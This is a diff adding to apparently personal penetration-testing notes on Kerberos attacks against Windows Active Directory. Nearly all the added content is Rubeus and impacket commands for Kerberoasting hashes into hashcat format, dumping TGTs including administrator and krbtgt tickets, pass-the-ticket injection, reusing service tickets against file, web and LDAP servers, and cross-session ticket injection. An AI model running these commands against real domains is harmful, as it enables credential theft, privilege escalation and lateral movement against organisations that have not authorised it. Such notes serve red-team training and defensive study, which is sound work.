@@ -119,11 +119,80 @@ Basic Kerberoasting Flow
 
 Windows go to imo
 ```powershell
+# Action: Triage Kerberos Tickets (All Users)
+.\Rubeus.exe triage
+
 # Enumerate only
 .\Rubeus.exe kerberoast /stats
 
 # Request all TGS tickets and output as hashcat format
 .\Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat
+```
+
+```powershell
+# TGT Extraction
+
+#  TGT request with known user credentials
+.\Rubeus.exe asktgt /user:domain_user /password:domain_user_pw /domain:domain.com /dc:DC_IP /outfile:tgt.kirbi
+
+# Extract all TGTs with clean output
+Rubeus.exe dump /service:krbtgt /nowrap
+
+# Extract from specific user session
+Rubeus.exe dump /user:administrator /service:krbtgt /nowrap
+
+# Extract from elevated session
+Rubeus.exe dump /luid:0x12345 /service:krbtgt /nowrap
+```
+
+```powershell
+#https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/extraction/dump
+
+# TGT Injection
+# Inject extracted TGT
+Rubeus.exe ptt /ticket:[BASE64_TGT]
+
+# Verify injection success
+Rubeus.exe klist
+
+# Test domain access
+dir \\dc01.corp.local\c$
+```
+
+```powershell
+#https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/extraction/dump
+
+# service ticket re-use
+# Extract specific service tickets
+Rubeus.exe dump /service:cifs /server:fileserver.corp.local /nowrap
+Rubeus.exe dump /service:http /server:web01.corp.local /nowrap
+Rubeus.exe dump /service:ldap /server:dc01.corp.local /nowrap
+
+# Inject service ticket
+Rubeus.exe ptt /ticket:[BASE64_SERVICE_TICKET]
+
+# Access target service directly
+net use \\fileserver.corp.local\share
+powershell -c "Invoke-WebRequest http://web01.corp.local"
+```
+
+```powershell
+#https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/extraction/dump
+
+# Cross-Session Operations
+# Create new session context
+Rubeus.exe createnetonly /program:cmd.exe
+
+# Extract tickets from source session
+Rubeus.exe dump /luid:0x[source] /nowrap
+
+# Inject into new session
+Rubeus.exe ptt /ticket:[BASE64] /luid:0x[target]
+```
+
+```bash
+# linux
+impacket-ticketConverter tgt.kirbi SRV01.ccache
 ```
 
 Linux go to imo
